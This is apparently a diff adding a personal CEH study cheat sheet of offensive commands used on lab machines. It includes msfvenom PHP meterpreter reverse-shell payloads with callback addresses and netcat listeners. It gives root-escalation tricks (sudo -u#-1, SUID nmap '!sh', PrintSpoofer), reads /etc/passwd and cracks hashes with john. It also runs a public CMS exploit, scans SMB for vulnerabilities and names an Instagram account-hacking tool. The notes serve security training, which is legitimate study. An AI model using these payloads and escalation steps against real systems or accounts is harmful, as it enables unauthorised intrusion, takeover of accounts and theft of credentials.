@@ -1,0 +1,281 @@
+Ceh note points :
+
+----------------------------------------------------------------------------------------
+https://crackstation.com -- crack md5 and other hashes
+----------------------------------------------------------------------------------------
+reverse shell creation: 
+
+https://www.revshells.com/ -- to create a reverse shell 
+https://pintestmonkey.com/
+
+nc -vv -l -p 9001   --listing to port 
+
+┌──(leon㉿leo)-[~]
+└─$ curl http://10.10.173.92/404.php         -- to execute php file 
+----------------------------------------------------------------------------------------
+For file transfer ftp: 
+
+python -m SimpleHTTPServer 8080
+
+on guest/ traget system listing = http://192.168.235.128:8080/Desktop/
+
+----------------------------------------------------------------------------------------
+
+Detailed nmap scan info : 
+
+nmap -sC -sV -A <ip>
+
+
+----------------------------------------------------------------------------------------
+search exploit:
+
+searchsploit <http generator>
+----------------------------------------------------------------------------------------
+
+instagram hacking 
+
+instashell
+
+
+
+----------------------------------------------------------------------------------------
+
+payload using msfvenom 
+
+msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.235.128 LPORT=8080 -f raw > shell.php   
+
+msfvenom -p php/meterpreter/reverse_tcp LHOST=10.9.3.53 LPORT=4444 -f raw > revshell_4444.exe
+
+----------------------------------------------------------------------------------------
+
+GIT php_reverse_tcp payload :
+
+git download php_revrese_tcp
+
+change the ip field as of the tun0 
+and port to 4444
+
+run the shell.php file on browser by browsing it (click to run)
+
+listen on port :
+ nc -lvnp 4444
+ 
+ 
+ ----------------------------------------------------------------------------------------
+ 
+ 
+ FIND any file in bash/shell window:
+ 
+	find / -type f -name <filename.extention>
+ 
+ FIND root permited folders and files
+
+	find / -user root -perm /4000 
+	find / -user root -perm /4000 2><folderdir>
+ 
+ ----------------------------------------------------------------------------------------
+ 
+ 
+ check all users in bash window :
+ 
+ cat /etc/passwd
+ 
+ 
+----------------------------------------------------------------------------------------
+john the ripper 
+
+create a hash.txt file >hash.txt
+
+john hashh.txt --wordlist=rockyou.txt      
+
+ 
+----------------------------------------------------------------------------------------
+
+BORG tool to decrypt archive.tar file using password
+
+mkdir /mounted  
+borg mount . mounted/
+
+----------------------------------------------------------------------------------------
+IMAGE RECON
+
+exiftool to gather info from JPG
+
+exiftool text.jpg
+
+
+BINWALK :
+
+binwalk -e cute-alien.jpg 
+
+
+move to the extracted folder if consist any 
+
+cd _cutie.png.extracted
+
+
+
+----------------------------------------------------------------------------------------
+unzip a zip file
+
+7z e 8702.zip 
+
+if protected use john 
+
+zip2john test.zip > test.txt          -- saving the hash
+
+breaking the hash 
+
+john test.txt -wordlist=rockyou.txt
+
+----------------------------------------------------------------------------------------
+
+ To extract stegfile :
+ 
+ steghide extract -sf <filename>.jpg    -- jpg file cracker
+
+----------------------------------------------------------------------------------------
+
+To get file from ssh server to local:
+
+scp user@ip:/<filename> .     --- . for current directory 
+
+example : scp james@10.10.14.98:/Alien_autospy.jpg .
+
+----------------------------------------------------------------------------------------
+
+when in ssh server there allowed than root then , its a bug if you provide any user other that root which is not exist like "-1" or any random number it will redirect to root
+for privilage esclation:
+
+sudo -u#-1 /bin/bash
+
+
+----------------------------------------------------------------------------------------
+
+gtfobins site :
+
+https://gtfobins.github.io/
+for privilage escalate tool after ssh 
+
+when you get : sudo -l
+(root : root) NOPASSWD: /usr/bin/zip
+
+
+----------------------------------------------------------------------------------------
+Change Python2 script to python3 :
+
+
+
+                                                                                                                                                                   
+┌──(leon㉿leo)-[~/Downloads/cms-simple]
+└─$ sudo mv 46635.py run                                                                                                                                        1 ⨯
+                                                                                                                                                                    
+┌──(leon㉿leo)-[~/Downloads/cms-simple]
+└─$ ls
+run
+                                                                                                                                                                    
+┌──(leon㉿leo)-[~/Downloads/cms-simple]
+└─$ 2to3-2.7 run -w
+
+
+nano run and change the python to python3
+                                                                                                                          
+┌──(leon㉿leo)-[~/Downloads/cms-simple]
+└─$ pluma run &
+[1] 8228
+                                                                                                                          
+┌──(leon㉿leo)-[~/Downloads/cms-simple]
+└─$                                                                                                                   1 ⚙
+[1]  + done       pluma run
+┌──(leon㉿leo)-[~/Downloads/cms-simple]
+└─$ chmod 700 run          
+                                                                                                                          
+┌──(leon㉿leo)-[~/Downloads/cms-simple]
+└─$ ./run -u http://10.10.133.87/simple/
+
+
+----------------------------------------------------------------------------------------
+
+in bash window using rev shell :
+
+python -c 'import pty;pty.spawn ("bin/bash")'      --- provide user access
+
+to know whats there to esc prev
+robot@linux:~$ find / -perm -4000 2>/dev/null
+
+res:
+
+/bin/ping
+/bin/umount
+/bin/mount
+/bin/ping6
+/bin/su
+/usr/bin/passwd
+/usr/bin/newgrp
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/sudo
+/usr/local/bin/nmap
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
+/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
+/usr/lib/pt_chown
+
+
+to escalate prev :
+nmap -h
+nmap --interactive
+nmap>!sh    -- to get shell window
+
+nmap> !sh
+!sh
+# id
+id
+uid=1002(robot) gid=1002(robot) euid=0(root) groups=0(root),1002(robot)
+
+have root folder access 
+can do cd root 
+ 
+----------------------------------------------------------------------------------------
+
+windows privEsc:
+
+https://github.com/dievus/printspoofer:
+
+printSpoofer.exe -i -c cmd
+
+
+----------------------------------------------------------------------------------------
+#smb-client: connection  & listing of user
+
+
+smbclient -L 10.10.142.169                                                     1 ⨯
+Enter WORKGROUP\leon's password: 
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+        nt4wrksv        Disk      
+SMB1 disabled -- no workgroup available
+
+
+#connceting to user : nt4weksv
+
+smbclient \\\\10.10.142.169\\nt4wrksv
+
+
+
+---------------------------------------------------------
+nmap scripts for scans:
+ls /usr/share/nmap/scripts 
+
+
+nmap smb-vuln check :
+
+nmap --script smb-vuln* -p 139,445 10.10.142.169
+
+---------------------------------------------------------
